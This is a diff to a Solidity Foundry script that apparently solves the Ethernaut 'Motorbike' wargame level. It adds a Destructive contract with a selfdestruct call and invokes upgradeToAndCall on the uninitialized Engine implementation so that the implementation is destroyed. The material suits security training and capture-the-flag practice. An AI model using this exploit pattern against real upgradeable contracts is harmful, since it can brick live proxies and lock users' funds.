@@ -11,6 +11,12 @@ interface Engine {
     function upgradeToAndCall(address newImplementation, bytes memory data) external;
 }
 
+contract Destructive {
+    function kill() external {
+        selfdestruct(payable(address(0)));
+    }
+}
+
 contract MotorbikeScript is Script {
 
     // `contract.address`
@@ -19,8 +25,6 @@ contract MotorbikeScript is Script {
     // `await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")`
     // Engine address: 0x6b7c98b2205441466a3db270d76a286e3d945dc0
     Engine engine = Engine(0x6B7C98b2205441466a3db270d76a286E3d945Dc0);
-
-    // Level25 contract deployed to: 0xA1F740AEb92FDFC4669976913f3fffCe10540742
 
     function setUp() public {}
 
@@ -32,7 +36,8 @@ contract MotorbikeScript is Script {
         bytes memory encodedData = abi.encodeWithSignature("kill()");
 
         // Deploy selfdestruct contract at
-        engine.upgradeToAndCall(0xA1F740AEb92FDFC4669976913f3fffCe10540742, encodedData);
+        address destructive = address(new Destructive());
+        engine.upgradeToAndCall(destructive, encodedData);
 
         vm.stopBroadcast();
     }
